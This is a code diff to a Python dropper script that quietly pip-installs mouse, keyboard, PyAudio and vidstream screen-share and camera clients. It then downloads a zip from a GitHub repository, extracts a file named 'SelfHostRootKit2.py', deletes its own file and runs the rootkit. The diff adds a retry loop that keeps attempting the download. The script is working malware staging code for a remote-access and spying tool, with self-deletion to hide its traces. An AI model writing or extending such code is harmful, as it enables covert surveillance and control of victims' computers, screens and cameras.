@@ -3,6 +3,19 @@ tryit = False
 for i in range(2):
     while tryit == False:
         try:
+            import mouse
+            tryit = True
+        except:
+            subprocess.Popen("py -m pip install mouse")
+            time.sleep(5)
+    try:
+        import keyboard
+        keyboard.write("")
+    except:
+        subprocess.Popen("py -m pip install keyboard")
+        time.sleep(5)
+    while tryit == False:
+        try:
             import PIL
             tryit = True
         except:
@@ -67,8 +80,7 @@ for i in range(2):
     tryit = False
     while tryit == False:
         try:
-            from vidstream import ScreenShareClient
-            from vidstream import CameraClient
+            from vidstream import ScreenShareClient, CameraClient
             tryit = True
         except:
             dir = "whl-main"
@@ -84,13 +96,18 @@ for i in range(2):
             os.remove("PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
             time.sleep(5)
 
-
-url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"
-listfile = "SelfHostRootKit2.py"
-dir = getNameDir(url)
-downloadFileGithub(url)
-moveFileFromDir(dir, listfile)
-time.sleep(1)
-supDir(dir)
+tryit = True
+while tryit == True:
+    try:
+        url, listfile = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip", "SelfHostRootKit2.py"
+        dir = getNameDir(url)
+        downloadFileGithub(url)
+        moveFileFromDir(dir, listfile)
+        time.sleep(1)
+        supDir(dir)
+    except:
+        print("download error")
+        time.sleep(0.5)
+        pass
 os.remove(getFileName())
 os.system("SelfHostRootKit2.py")
